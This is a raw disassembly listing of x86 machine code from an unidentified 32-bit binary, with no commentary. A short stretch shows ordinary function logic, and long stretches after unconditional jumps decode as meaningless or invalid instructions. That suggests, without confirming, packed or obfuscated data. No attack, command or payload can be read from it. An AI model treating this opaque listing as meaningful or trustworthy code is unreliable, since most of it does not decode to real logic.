  4073ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4073b1:	mov    eax,DWORD PTR [ebp+0xc]
  4073b4:	xor    ecx,esi
  4073b6:	add    ecx,edi
  4073b8:	xor    edx,edx
  4073ba:	div    ecx
  4073bc:	mov    ecx,DWORD PTR [ebp-0x8]
  4073bf:	cmp    ecx,eax
  4073c1:	jne    0x4073cc
  4073c7:	call   0x401000
  4073cc:	lea    eax,[ebp+0x4]
  4073cf:	mov    DWORD PTR [ebp-0x24],eax
  4073d2:	mov    eax,ds:0x413bde
  4073d7:	push   0x4
  4073d9:	add    eax,0x1cc
  4073de:	push   eax
  4073df:	lea    eax,[ebp-0xc]
  4073e2:	push   eax
  4073e3:	call   0x410353
  4073e8:	mov    eax,DWORD PTR [ebp-0xc]
  4073eb:	mov    eax,DWORD PTR [ebp-0x4]
  4073ee:	mov    eax,DWORD PTR [ebp-0x8]
  4073f1:	mov    DWORD PTR [ebp+0xc],eax
  4073f4:	mov    eax,ds:0x413c62
  4073f9:	mov    ecx,DWORD PTR [ebp+0xc]
  4073fc:	sub    eax,edi
  4073fe:	xor    eax,esi
  407400:	cmp    eax,ecx
  407402:	je     0x407449
  407408:	mov    eax,ds:0x413c5a
  40740d:	mov    ecx,DWORD PTR [ebp+0xc]
  407410:	sub    eax,edi
  407412:	xor    eax,esi
  407414:	cmp    eax,ecx
  407416:	jne    0x40742c
  40741c:	mov    eax,ds:0x413c62
  407421:	add    eax,DWORD PTR ds:0x413c5a
  407427:	jmp    0x407433
  40742c:	mov    eax,DWORD PTR [ebp+0xc]
  40742f:	xor    eax,esi
  407431:	add    eax,edi
  407433:	mov    ds:0x413c5a,eax
  407438:	mov    eax,DWORD PTR [ebp+0xc]
  40743b:	xor    eax,esi
  40743d:	add    eax,edi
  40743f:	mov    ds:0x413c62,eax
  407444:	jmp    0x407453
  407449:	mov    eax,ds:0x413c62
  40744e:	mov    ds:0x413c5a,eax
  407453:	mov    eax,DWORD PTR [ebp-0x24]
  407456:	mov    ecx,DWORD PTR ds:0x413c5a
  40745c:	add    DWORD PTR [eax],ecx
  40745e:	mov    eax,DWORD PTR [ebp-0xc]
  407461:	mov    eax,DWORD PTR [eax]
  407463:	pop    edi
  407464:	pop    esi
  407465:	pop    ebx
  407466:	leave  
  407467:	ret    0xc
  40746a:	push   ebp
  40746b:	mov    ebp,esp
  40746d:	push   ecx
  40746e:	push   ecx
  40746f:	mov    DWORD PTR ds:0x43376f,edi
  407475:	mov    eax,0x5a3fc98
  40747a:	movzx  ecx,WORD PTR ds:0x43372f
  407481:	mov    DWORD PTR [ebp-0x4],eax
  407484:	jmp    0x4077cf
  407489:	shl    DWORD PTR [edi],0x5f
  40748c:	sbb    DWORD PTR [ecx+0x61],ebx
  40748f:	inc    ecx
  407490:	out    0xc2,eax
  407492:	jle    0x40743d
  407494:	inc    ebx
  407495:	sub    al,0x61
  407497:	pop    ebp
  407498:	leave  
  407499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40749a:	sar    BYTE PTR [esi+0x7e],0x20
  40749e:	jge    0x40751e
  4074a0:	jle    0x4074fe
  4074a2:	in     eax,0x43
  4074a4:	ins    DWORD PTR es:[edi],dx
  4074a5:	ins    BYTE PTR es:[edi],dx
  4074a6:	push   esi
  4074a7:	cwde   
  4074a8:	mov    eax,ds:0x36dc1ad
  4074ad:	inc    edi
  4074ae:	in     eax,dx
  4074af:	and    al,0x3e
  4074b1:	pop    ss
  4074b2:	sbb    DWORD PTR [ebx],edx
  4074b4:	jecxz  0x4074a8
  4074b6:	xchg   ebp,eax
  4074b7:	xchg   edi,eax
  4074b8:	fisub  DWORD PTR [ebp+0x6]
  4074bb:	sbb    ah,BYTE PTR [esi+edx*2-0x7d1a12fc]
  4074c2:	(bad)  
  4074c3:	dec    eax
  4074c4:	fst    DWORD PTR [edi+0xa]
  4074c7:	pop    edi
  4074c8:	out    dx,eax
  4074c9:	test   ah,0x80
  4074cc:	mov    ch,0x56
  4074ce:	sahf   
  4074cf:	add    BYTE PTR fs:[ecx-0x183d992d],al
  4074d6:	jns    0x407536
  4074d8:	fs ret 0x9698
  4074dc:	xlat   BYTE PTR ds:[ebx]
  4074dd:	mov    ebp,0xd27375ca
  4074e2:	adc    ecx,DWORD PTR [edi-0x4c]
  4074e5:	pop    es
  4074e6:	jno    0x4074fa
  4074e8:	push   edi
  4074e9:	mov    edi,0xff3b144b
  4074ee:	mov    ch,0x33
  4074f0:	lods   al,BYTE PTR ds:[esi]
  4074f1:	cmp    dh,ch
  4074f3:	nop
  4074f4:	dec    esp
  4074f5:	ds sub eax,0x2e7ecebf
  4074fb:	fisttp QWORD PTR [esi+0x39]
  4074fe:	sbb    eax,0x39350890
  407503:	cmp    al,0xe4
  407505:	jge    0x40752c
  407507:	outs   dx,DWORD PTR ds:[esi]
  407508:	mov    DWORD PTR [esi-0x72],ebx
  40750b:	add    DWORD PTR [eax],0x64
  40750e:	aaa    
  40750f:	or     BYTE PTR fs:[eax+0x48762303],cl
  407516:	adc    ch,BYTE PTR [edx-0x12]
  407519:	pop    ebx
  40751a:	js     0x407528
  40751c:	test   al,0xc3
  40751e:	and    eax,0x964ce763
  407523:	test   DWORD PTR [ecx-0x40],edi
  407526:	add    BYTE PTR [ebp+0x3e],ch
  407529:	mov    ds:0x1b44a27c,eax
  40752e:	ret    
  40752f:	jmp    0x1ef1bf2e
  407534:	mov    edx,0x8698d7d1
  407539:	add    cl,BYTE PTR [ebx-0x47734bd6]
  40753f:	xchg   esi,eax
  407540:	inc    ecx
  407541:	push   ss
  407542:	ror    DWORD PTR [ecx-0x55],0x59
  407546:	es pusha 
  407548:	shr    DWORD PTR [esp+ecx*8],cl
  40754b:	ret    
  40754c:	and    DWORD PTR [edi+ebx*8+0x0],ecx
  407550:	int    0x57
  407552:	mov    esi,0x614022ad
  407557:	lock xchg ebx,eax
  407559:	test   al,0xbd
  40755b:	mov    dh,0x99
  40755d:	mov    ebx,DWORD PTR ds:0xbfbf6c6d
  407563:	adc    ebx,DWORD PTR [esi-0x54]
  407566:	es call 0x722acac8
  40756c:	arpl   WORD PTR [eax+0x73],bp
  40756f:	sti    
  407570:	aas    
  407571:	push   ecx
  407572:	stos   DWORD PTR es:[edi],eax
  407573:	inc    edx
  407574:	push   edi
  407575:	clc    
  407576:	jecxz  0x4075b3
  407578:	sub    DWORD PTR [edi+ecx*1+0x49],esi
  40757c:	jp     0x407540
  40757e:	mov    dh,BYTE PTR [edi]
  407580:	jb     0x407561
  407582:	inc    ebp
  407583:	dec    eax
  407584:	jle    0x407510
  407586:	mov    ebp,0x8b5cf207
  40758b:	cmp    al,0x3a
  40758d:	in     al,dx
  40758e:	cmc    
  40758f:	es nop
  407591:	push   ebx
  407592:	push   eax
  407593:	fnstenv [ecx]
  407595:	mov    ecx,DWORD PTR [ebx]
  407597:	test   BYTE PTR [edi-0x1e],cl
  40759a:	or     BYTE PTR ds:0xcc23d4c4,0x65
  4075a1:	daa    
  4075a2:	dec    esp
  4075a3:	jmp    0xfbe65b95
  4075a8:	add    al,0xa
  4075aa:	push   ecx
  4075ab:	popa   
  4075ac:	mov    edi,0xdf504346
  4075b1:	add    al,0x7e
  4075b3:	jb     0x4075cc
  4075b5:	icebp  
  4075b6:	jae    0x4075db
  4075b8:	push   es
  4075b9:	mov    WORD PTR fs:[ecx+0x4b],ss
  4075bd:	push   ss
  4075be:	push   0x4c6b7bed
  4075c3:	nop
  4075c4:	xor    cl,BYTE PTR [edx*2+0x61c3d445]
  4075cb:	into   
  4075cc:	int    0xec
  4075ce:	pop    es
  4075cf:	jmp    0x4075cc
  4075d1:	cmc    
  4075d2:	xchg   ebx,eax
  4075d3:	cmp    eax,0xd1c88eae
  4075d8:	mov    ds:0xb610d819,al
  4075dd:	push   es
  4075de:	pop    edx
  4075df:	jg     0x407617
  4075e1:	cmp    edi,DWORD PTR [edx]
  4075e3:	add    ebx,DWORD PTR [esi+ebp*2]
  4075e6:	push   eax
  4075e7:	adc    ebp,DWORD PTR [edi+0x3f5bbc97]
  4075ed:	(bad)  
  4075ee:	mov    DWORD PTR [edi-0x66],ecx
  4075f1:	hlt    
  4075f2:	sbb    ebx,edi
  4075f4:	pop    ds
  4075f5:	imul   edx,DWORD PTR [esp+eax*2+0x1c],0xfffffff4
  4075fa:	xchg   ecx,eax
  4075fb:	inc    edx
  4075fc:	enter  0x94db,0xc5
  407600:	or     ch,ah
  407602:	or     al,0xae
  407604:	xor    DWORD PTR [ecx],eax
  407606:	je     0x4075d5
  407608:	mov    bl,0xcb
  40760a:	rol    BYTE PTR [edi-0x64],cl
  40760d:	bound  edx,QWORD PTR cs:[ebp+0x53732118]
  407614:	outs   dx,BYTE PTR ds:[esi]
  407615:	xchg   ebx,eax
  407616:	mov    bh,0x95
  407618:	mov    BYTE PTR [ebx+0x7e5563b2],cl
  40761e:	xchg   ebx,eax
  40761f:	lods   al,BYTE PTR ds:[esi]
  407620:	dec    ecx
  407621:	sahf   
  407622:	push   ebx
  407623:	inc    esp
  407624:	push   edx
  407625:	or     DWORD PTR [ebp-0x7faba8d3],edi
  40762b:	sbb    edi,DWORD PTR [ebp-0x47]
  40762e:	sub    DWORD PTR [ecx],ebp
  407630:	icebp  
  407631:	push   ds
  407632:	pop    ebp
  407633:	repz (bad) 
  407635:	sub    DWORD PTR [eax+edx*4],ebp
  407638:	(bad)  
  407639:	mov    ah,0xd8
  40763b:	jecxz  0x4075de
  40763d:	xchg   edi,eax
  40763e:	(bad)  
  40763f:	in     eax,dx
  407640:	inc    esp
  407641:	inc    edi
  407642:	and    DWORD PTR [edx],edx
  407644:	push   eax
  407645:	rcl    DWORD PTR [ebp+0x7569e8f8],0x79
  40764c:	jo     0x4075ef
  40764e:	jl     0x407692
  407650:	(bad)  
  407651:	xchg   ebx,eax
  407652:	mov    al,0x43
  407654:	jg     0x407600
  407656:	pop    esp
  407657:	outs   dx,DWORD PTR ds:[esi]
  407658:	xchg   edx,eax
  407659:	imul   esi,DWORD PTR [ecx+0x52],0xb7b666f6
  407660:	add    ax,0xe40b
  407664:	push   esi
  407665:	cdq    
  407666:	push   ebx
  407667:	xor    BYTE PTR [ebx+0x7f],dh
  40766a:	sahf   
  40766b:	sbb    BYTE PTR [ecx-0x33],ch
  40766e:	(bad)
  407671:	imul   edx,DWORD PTR [ecx+0x61bbfc56],0xffffffe8
  407678:	es int 0x5b
  40767b:	cmp    eax,DWORD PTR [edx]
  40767d:	(bad)  
  40767f:	push   cs
  407680:	mov    dl,0x69
  407682:	push   0x2e
  407684:	xlat   BYTE PTR ds:[ebx]
  407685:	into   
  407686:	sbb    BYTE PTR [edi+0x275b3f0b],bh
  40768c:	test   DWORD PTR [ecx-0x47],esp
  40768f:	sub    DWORD PTR [eax],ebx
  407691:	jb     0x4076c1
  407693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407694:	jl     0x407686
  407696:	test   eax,0xd0f70974
  40769b:	xchg   ebx,eax
  40769c:	cs jp  0x407680
  40769f:	(bad)  
  4076a1:	and    ebp,DWORD PTR [ebx+0x6b]
  4076a4:	aas    
  4076a5:	jp     0x4076b6
  4076a7:	les    ebp,FWORD PTR [edx+0x28f8822b]
  4076ad:	(bad)  
  4076ae:	sar    dl,0xca
  4076b1:	ret    0xc850
  4076b4:	(bad)  
  4076b5:	lea    ebx,[ecx-0x4d]
  4076b8:	xchg   DWORD PTR [eax],ebx
  4076ba:	ror    DWORD PTR [edx-0x52a40e04],cl
  4076c0:	or     DWORD PTR ds:0x9624407c,ebp
  4076c6:	mov    ecx,0x12743b7c
  4076cb:	imul   eax,DWORD PTR [eax],0x90af424a
  4076d1:	mov    ebx,0x40402b8f
  4076d6:	aas    
  4076d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076d8:	add    BYTE PTR [ebp+0x3a],0x23
  4076dc:	lds    ecx,FWORD PTR [edx]
  4076de:	push   ebx
  4076df:	sbb    eax,0x190648b
  4076e4:	std    
  4076e5:	nop
  4076e6:	call   0x2ef7:0x1f5e910a
  4076ed:	je     0x4076ee
  4076ef:	fsub   DWORD PTR [esi+0x7ce650b3]
  4076f5:	dec    ebx
  4076f6:	(bad)  [ebp-0x80]
  4076f9:	jmp    0x90409f16
  4076fe:	jecxz  0x4076a1
  407700:	jmp    0x4076bc
  407702:	pop    ecx
  407703:	stc    
  407704:	pusha  
  407705:	shl    al,1
  407707:	mov    BYTE PTR [eax+0x1580199e],dl
  40770d:	push   edi
  40770e:	into   
  40770f:	pop    es
  407710:	std    
  407711:	ins    DWORD PTR es:[edi],dx
  407712:	jle    0x407787
  407714:	repnz aas 
  407716:	sbb    DWORD PTR [ebp+0x68],esp
  407719:	pop    es
  40771a:	sbb    DWORD PTR [ecx],0x31
  40771d:	xchg   ebx,eax
  40771e:	sbb    BYTE PTR [ecx],bh
  407720:	pop    esp
  407721:	adc    DWORD PTR [ecx],ebx
  407723:	retf   0x9974
  407726:	xchg   esp,eax
  407727:	jno    0x4077a7
  407729:	cdq    
  40772a:	in     eax,dx
  40772b:	enter  0xff13,0x2d
  40772f:	sub    DWORD PTR [edi],ebx
  407731:	jp     0x407700
  407733:	enter  0x5c03,0x7c
  407737:	jp     0x40771b
  407739:	xor    DWORD PTR cs:[esi-0x16136898],edx
  407740:	ret    0xa2e4
  407743:	sbb    ch,BYTE PTR [ebx-0x71cd47a5]
  407749:	outs   dx,DWORD PTR ds:[esi]
  40774a:	pop    ecx
  40774b:	in     al,0x88
  40774d:	adc    al,0x60
  40774f:	adc    eax,0xe0647f55
  407754:	rcl    DWORD PTR [edx-0x7f23ed35],1
  40775a:	dec    ebx
  40775b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40775c:	shl    DWORD PTR [edi-0x29],1
  40775f:	sbb    DWORD PTR [ecx+0x3a53b3ca],edx
  407765:	out    0x27,eax
  407767:	icebp  
  407768:	xor    esp,DWORD PTR [eax-0x5]
  40776b:	jp     0x40778a
  40776d:	mov    bl,0x4b
  40776f:	stos   DWORD PTR es:[edi],eax
  407770:	out    0xad,al
  407772:	test   BYTE PTR [esi-0x7c],dh
  407775:	mov    dh,0xaa
  407777:	jbe    0x407760
  407779:	ins    DWORD PTR es:[edi],dx
  40777a:	and    bl,bl
  40777c:	scas   eax,DWORD PTR es:[edi]
  40777d:	jae    0x4077b7
  40777f:	jp     0x4077ed
  407781:	sti    
  407782:	jle    0x40771d
  407784:	push   esp
  407785:	test   DWORD PTR [eax+0xc],eax
  407788:	iret   
  407789:	enter  0x632a,0x24
  40778d:	pop    ebx
  40778e:	fbstp  TBYTE PTR [ebp+0x14]
  407791:	scas   eax,DWORD PTR es:[edi]
  407792:	pop    ecx
  407793:	push   ecx
  407794:	out    dx,al
  407795:	or     BYTE PTR [ebp+0x1ea22fcb],0x71
  40779c:	jbe    0x92941a9
  4077a2:	stos   BYTE PTR es:[edi],al
  4077a3:	js     0x407796
  4077a5:	and    bl,ch
  4077a7:	test   BYTE PTR [edx],bh
  4077a9:	mov    ah,0x93
  4077ab:	dec    esi
  4077ac:	ss fwait
  4077ae:	ds and al,0x76
  4077b1:	fist   DWORD PTR [esp+ecx*1-0x6a437b95]
  4077b8:	xlat   BYTE PTR ds:[ebx]
  4077b9:	(bad)  
  4077ba:	mov    ds:0x1c2ee5a3,eax
  4077bf:	fsub   DWORD PTR [edi+0x14d5e22]
  4077c5:	out    0x29,eax
  4077c7:	adc    DWORD PTR [eax+0x9],edi
  4077ca:	ror    BYTE PTR [esi-0x74cd79fc],1
  4077d0:	dec    ebp
  4077d1:	cld    
  4077d2:	mov    DWORD PTR ds:0x4337a7,0x5e65
  4077dc:	mov    DWORD PTR [ebp-0x8],0x4ec1
  4077e3:	jmp    0x407b2e
  4077e8:	out    dx,eax
  4077e9:	psubd  mm2,QWORD PTR [ecx+0x5a]
  4077ed:	push   ecx
  4077ee:	cmc    
  4077ef:	mov    cl,0x14
  4077f1:	loop   0x40786d
  4077f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077f4:	cs mov cl,0xbc
  4077f7:	jmp    0x7ebf4752
  4077fc:	and    BYTE PTR [ebp+0x7e],bh
  4077ff:	jle    0x4077c6
  407801:	stc    
  407802:	sbb    al,0xaf
  407804:	repnz cmp eax,0xae6bdde
  40780a:	xchg   ebp,eax
  40780b:	jge    0x407860
  40780d:	jecxz  0x4077bd
  40780f:	test   BYTE PTR [ecx+0x3f],bh
  407812:	ret    
  407813:	add    cl,cl
  407815:	in     eax,0x5
  407817:	hlt    
  407818:	in     eax,dx
  407819:	xor    al,0x52
  40781b:	xchg   edx,eax
  40781c:	leave  
  40781d:	dec    ebx
  40781e:	push   esp
  40781f:	mov    edi,0x602359c4
  407824:	fimul  WORD PTR [ebx+edi*8-0x1e4b219a]
  40782b:	in     eax,0xe0
  40782d:	dec    edx
  40782e:	bound  eax,QWORD PTR [eax+ebp*1-0x39fe9c1b]
  407835:	jb     0x4077da
  407837:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407838:	(bad)  
  40783a:	mov    dh,0x8f
  40783c:	ja     0x4077c8
  40783e:	cmp    DWORD PTR cs:[edi+0x35fc9a50],esi
  407845:	inc    eax
  407846:	jmp    0x40784e
  407848:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407849:	ins    BYTE PTR es:[edi],dx
  40784a:	mov    esp,0xcff5e1f2
  40784f:	dec    esi
  407850:	and    eax,0xfd33611e
  407855:	(bad)  
  407856:	dec    edi
  407857:	sahf   
  407858:	ficomp DWORD PTR [esi+ebp*8-0x28]
  40785c:	xor    ebx,ebx
  40785e:	or     ebx,DWORD PTR [ecx]
  407860:	cld    
  407861:	lods   eax,DWORD PTR gs:[esi]
  407863:	lea    ecx,[esi+0x1a]
  407866:	mov    ecx,esp
  407868:	test   BYTE PTR [edx+0x254f8f6f],bh
  40786e:	and    cl,BYTE PTR [ebx+0x4eebf21b]
  407874:	sub    ecx,DWORD PTR [esi+eiz*2]
  407877:	lods   al,BYTE PTR ds:[esi]
  407878:	add    cl,BYTE PTR [eax-0x2e457467]
  40787e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40787f:	int3   
  407880:	inc    ebp
  407881:	pop    ecx
  407882:	mov    ecx,0xa6774747
  407887:	add    ch,BYTE PTR [edx-0x39]
  40788a:	popf   
  40788b:	clc    
  40788c:	sbb    esp,esi
  40788e:	jle    0x407857
  407890:	pop    edx
  407891:	shl    BYTE PTR [ebp+0x16cec979],1
  407897:	enter  0xabb7,0xfa
  40789b:	int    0xb9
  40789d:	ror    BYTE PTR [edx],0xa3
  4078a0:	sbb    BYTE PTR [eax-0x47],ch
  4078a3:	ret    
  4078a4:	std    
  4078a5:	mov    ch,0xb7
  4078a7:	stos   BYTE PTR es:[edi],al
  4078a8:	lods   al,BYTE PTR ds:[esi]
  4078a9:	mov    ah,BYTE PTR [edi+0x42939267]
  4078af:	aam    0x95
  4078b1:	fimul  WORD PTR [edi]
  4078b3:	adc    eax,0xb8f69b33
  4078b8:	mov    esp,0xf1a21fab
  4078bd:	mov    edx,0x48b6cc7
  4078c2:	cdq    
  4078c3:	and    ecx,DWORD PTR [edx-0x28]
  4078c6:	shl    DWORD PTR [eax+0xb4fd8c0],0x7e
  4078cd:	sar    DWORD PTR [eax+0x51033874],1
  4078d3:	mov    ah,0x7
  4078d5:	cmp    BYTE PTR [edi+eax*2+0x12ad055d],dl
  4078dc:	jns    0x407945
  4078de:	jmp    0x5593:0xf319a8e
  4078e5:	jl     0x4078cd
  4078e7:	test   BYTE PTR [edi-0x7a],bh
  4078ea:	repnz ror BYTE PTR [eax-0x44492e87],0xf3
  4078f2:	jge    0x407967
  4078f4:	arpl   WORD PTR [ebp+ebx*2+0x21e45869],bp
  4078fb:	push   0x3a9a9e4d
  407900:	outs   dx,DWORD PTR ds:[esi]
  407901:	mov    eax,ds:0xf8a4e070
  407906:	test   eax,0xa00e780f
  40790b:	test   al,0xb
  40790d:	popf   
  40790e:	jnp    0x40798e
  407910:	out    0x3,eax
  407912:	dec    esp
  407913:	xchg   edx,eax
  407914:	scas   eax,DWORD PTR es:[edi]
  407915:	std    
  407916:	mov    bh,0xa7
  407918:	aam    0xcc
  40791a:	dec    esi
  40791b:	scas   eax,DWORD PTR es:[edi]
  40791c:	adc    BYTE PTR [eax-0x47dd9293],ah
  407922:	and    al,BYTE PTR [edx-0x7f]
  407925:	xchg   ecx,eax
  407926:	jg     0x4078cf
  407928:	mov    dl,0x81
  40792a:	sub    DWORD PTR [edi-0x574bee0b],ebx
  407930:	test   DWORD PTR [edi+eiz*4+0x7f59e90a],ebp
  407937:	sbb    eax,0x7dbb9b21
  40793c:	cdq    
  40793d:	ins    DWORD PTR es:[edi],dx
  40793e:	(bad)  
  40793f:	xchg   edi,eax
  407940:	xlat   BYTE PTR ds:[ebx]
  407941:	and    esp,DWORD PTR [eax]
  407943:	inc    edi
  407944:	mov    dl,0x4
  407946:	loope  0x4078d5
  407948:	dec    ebp
  407949:	in     al,0x4
  40794b:	jmp    0xd6a0:0xec022eb7
  407952:	cdq    
  407953:	psrlq  mm3,mm7
  407956:	pop    es
  407957:	xchg   ebx,eax
  407958:	and    al,0x93
  40795a:	sbb    eax,DWORD PTR [edi+0x74]
  40795d:	add    eax,0xeb973fdd
  407962:	push   esp
  407963:	push   edx
  407964:	cmp    cl,ah
  407966:	lahf   
  407967:	mov    al,ds:0xc2ff66a3
  40796c:	ins    DWORD PTR es:[edi],dx
  40796d:	test   DWORD PTR [ebx],ebp
  40796f:	mov    ds:0xf932bef1,al
  407974:	enter  0x9b2b,0xa3
  407978:	mov    ebp,DWORD PTR ss:[ebx]
  40797b:	mov    esp,ecx
  40797d:	jns    0x407949
  40797f:	xchg   esp,eax
  407980:	lahf   
  407981:	stos   BYTE PTR es:[edi],al
  407982:	fs inc ecx
  407984:	cmp    DWORD PTR [ecx],esp
  407986:	mov    cs,WORD PTR [esi+0x7fee0229]
  40798c:	imul   esp,ebx,0x3d
  40798f:	fcmovu st,st(7)
  407991:	sbb    ebp,ebp
  407993:	scas   al,BYTE PTR es:[edi]
  407994:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407995:	fstp   QWORD PTR gs:[eax]
  407998:	(bad)  
  40799a:	lea    edi,[esi-0x50af43e4]
  4079a0:	data16 in al,0xa3
  4079a3:	bound  ecx,QWORD PTR [ecx+ebx*8-0x7279b2ac]
  4079aa:	(bad)
  4079ad:	pop    esi
  4079ae:	hlt    
  4079af:	fimul  WORD PTR [ecx+0xeb52c76]
  4079b5:	ds aas 
  4079b7:	mov    eax,0x1e55b736
  4079bc:	sbb    ebp,DWORD PTR [esi+0x3]
  4079bf:	in     eax,0xb0
  4079c1:	and    eax,0x2c47dcba
  4079c6:	mov    dh,0x5b
  4079c8:	les    esp,FWORD PTR [eax+0x59714a56]
  4079ce:	xchg   ebp,eax
  4079cf:	rcr    BYTE PTR [edx],1
  4079d1:	sar    DWORD PTR [edi+0x7e],0x7
  4079d5:	(bad)  
  4079d6:	adc    al,0x52
  4079d8:	out    dx,al
  4079d9:	imul   DWORD PTR [ebp+0x325af61]
  4079df:	adc    al,0x2c
  4079e1:	enter  0xd0c1,0xe3
  4079e5:	xor    al,0x81
  4079e7:	sbb    al,0x59
  4079e9:	push   eax
  4079ea:	cmp    eax,0x9011aa9d
  4079ef:	jbe    0x4079e8
  4079f1:	add    BYTE PTR cs:[ebx-0x658b4a63],bh
  4079f8:	cmp    al,0x7
  4079fa:	pop    ebx
  4079fb:	fnstsw WORD PTR [edx]
  4079fd:	gs (bad) 
  4079ff:	xchg   esp,eax
  407a00:	dec    esp
  407a01:	jl     0x407a23
  407a03:	ret    0x3898
  407a06:	fwait
  407a07:	lahf   
  407a08:	cmp    esi,edx
  407a0a:	mov    cl,0xf7
  407a0c:	jg     0x407a0d
  407a0e:	mov    esi,0x79c53898
  407a13:	(bad)  
  407a14:	sbb    DWORD PTR gs:[ebx-0x7c],ecx
  407a18:	jb     0x407a18
  407a1a:	dec    edx
  407a1b:	ffreep st(3)
  407a1d:	add    BYTE PTR [ebx-0x63],dh
  407a20:	jp     0x4079ad
  407a22:	xor    esp,DWORD PTR [ecx+0x4ef40257]
  407a28:	les    eax,FWORD PTR [esi]
  407a2a:	jcxz   0x4079f0
  407a2d:	jae    0x407a17
  407a2f:	push   ss
  407a30:	fwait
  407a31:	fs int3 
  407a33:	and    BYTE PTR [eax+0x504a7f19],cl
  407a39:	jle    0x407a47
  407a3b:	sbb    eax,0xb6934fbd
  407a40:	sti    
  407a41:	push   cs
  407a42:	mov    ds:0x40861361,eax
  407a47:	adc    bl,ch
  407a49:	mov    bh,0xdc
  407a4b:	cmp    al,0x1
  407a4d:	int3   
  407a4e:	mov    ds:0x44d12a8,eax
  407a53:	pop    esp
  407a54:	jge    0x4079da
  407a56:	mov    ebp,DWORD PTR [ecx]
  407a58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a59:	pusha  
  407a5a:	ja     0x407ad4
  407a5c:	jb     0x407a5b
  407a5e:	mov    bl,0xcc
  407a60:	shr    BYTE PTR [ebx+0x33de70ed],cl
  407a66:	pop    eax
  407a67:	cmc    
  407a68:	cwd    
  407a6a:	or     ebx,esp
  407a6c:	or     BYTE PTR [edx+eax*2+0x1c05f07d],ah
  407a73:	mov    ecx,esp
  407a75:	mov    esi,0x57461f7a
  407a7a:	push   ebp
  407a7b:	push   ecx
  407a7c:	outs   dx,BYTE PTR ds:[esi]
  407a7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a7e:	ins    DWORD PTR es:[edi],dx
  407a7f:	add    DWORD PTR [esi+eiz*2-0x557a6d6e],0x2144ca28
  407a8a:	not    DWORD PTR [ebx]
  407a8c:	jle    0x407a55
  407a8e:	or     edx,DWORD PTR ds:0xf33c2f6a
  407a94:	cmp    al,0x1b
  407a96:	cwde   
  407a97:	in     eax,0xe2
  407a99:	aaa    
  407a9a:	xor    ah,ah
  407a9c:	aas    
  407a9d:	dec    ecx
  407a9e:	pop    es
  407a9f:	mov    al,ds:0x431f6ef4
  407aa4:	sbb    sp,dx
  407aa7:	sbb    ch,bh
  407aa9:	test   DWORD PTR [ebp+0x560bbd7f],0xc6431c30
  407ab3:	adc    ah,cl
  407ab5:	das    
  407ab6:	cld    
  407ab7:	int3   
  407ab8:	and    eax,0xf97b25d1
  407abd:	int3   
  407abe:	fldcw  WORD PTR [edi+esi*2]
  407ac1:	sahf   
  407ac2:	sbb    ecx,esp
  407ac4:	lea    eax,[ecx+ebx*4+0x2dea6e5]
  407acb:	lds    ebp,FWORD PTR [ecx*2+0x3efd7e8c]
  407ad2:	add    bl,ah
  407ad4:	cmp    edi,DWORD PTR [eax-0x3d]
  407ad7:	or     eax,0xbac187cc
  407adc:	out    0xd0,eax
  407ade:	mov    ecx,0x255bd8d
  407ae3:	sub    BYTE PTR es:[edi],al
  407ae6:	mov    dh,0xea
  407ae8:	pusha  
  407ae9:	mov    esp,0xd593bdab
  407aee:	out    0xa9,al
  407af0:	cld    
  407af1:	push   esi
  407af2:	mov    al,ds:0x2aa34510
  407af7:	ss into 
  407af9:	add    ch,BYTE PTR [edx+eax*8+0x2e]
  407afd:	jecxz  0x407ab8
  407aff:	test   BYTE PTR [esi+esi*2],dh
  407b02:	sbb    BYTE PTR [ebp-0x7d55d6e4],cl
  407b08:	push   ecx
  407b09:	jb     0x407b3e
  407b0b:	push   0xaa63b6e8
  407b10:	cli    
  407b11:	cmp    eax,DWORD PTR [edi]
  407b13:	lods   al,BYTE PTR ds:[esi]
  407b14:	js     0x407b7a
  407b16:	xor    dl,bl
  407b18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b19:	fwait
  407b1a:	dec    edx
  407b1b:	mov    esp,0x71f7be1f
  407b20:	aam    0x63
  407b22:	(bad)  
  407b23:	repz adc eax,0x94cc6bf0
  407b29:	(bad)  
  407b2a:	ror    DWORD PTR [esi],1
  407b2c:	xchg   edx,eax
  407b2d:	arpl   WORD PTR [ebx],di
  407b2f:	enter  0x850f,0xc6
  407b33:	add    eax,DWORD PTR [eax]
  407b35:	add    BYTE PTR [esi-0x75],ah
  407b38:	inc    ebp
  407b39:	clc    
  407b3a:	xor    ecx,0x551
  407b40:	mov    ecx,0x8a3c
  407b45:	sub    DWORD PTR ds:0x433723,0x433767
  407b4f:	xor    ax,cx
  407b52:	mov    ecx,0x3b02
  407b57:	sub    DWORD PTR ds:0x433803,0x1193
  407b61:	add    ax,cx
  407b64:	mov    ecx,DWORD PTR [ebp+0x8]
  407b67:	movzx  eax,ax
  407b6a:	and    DWORD PTR ds:0x43372b,0x433827
  407b74:	not    eax
  407b76:	and    eax,DWORD PTR [ecx]
  407b78:	mov    DWORD PTR ds:0x43383b,0x844
  407b82:	mov    ecx,DWORD PTR [ebp+0x8]
  407b85:	mov    DWORD PTR ds:0x4337fb,0x1c5f
  407b8f:	mov    DWORD PTR [ecx],eax
  407b91:	jmp    0x407ee8
  407b96:	jmp    0x407ee1
  407b9b:	dec    eax
  407b9c:	sbb    dh,BYTE PTR [ebx-0x16]
  407b9f:	jno    0x407c14
  407ba1:	push   ecx
  407ba2:	cwde   
  407ba3:	mov    ds:0x32f6a3a4,al
  407ba8:	and    BYTE PTR [esi+ebp*8+0x78],cl
  407bac:	retf   
  407bad:	jle    0x407c2d
  407baf:	and    BYTE PTR [ebp+0x7e],bh
  407bb2:	jle    0x407bc0
  407bb4:	dec    ebp
  407bb5:	push   edx
  407bb6:	mov    ebx,0xa75a69b
  407bbb:	adc    dl,BYTE PTR ds:0x34688fd3
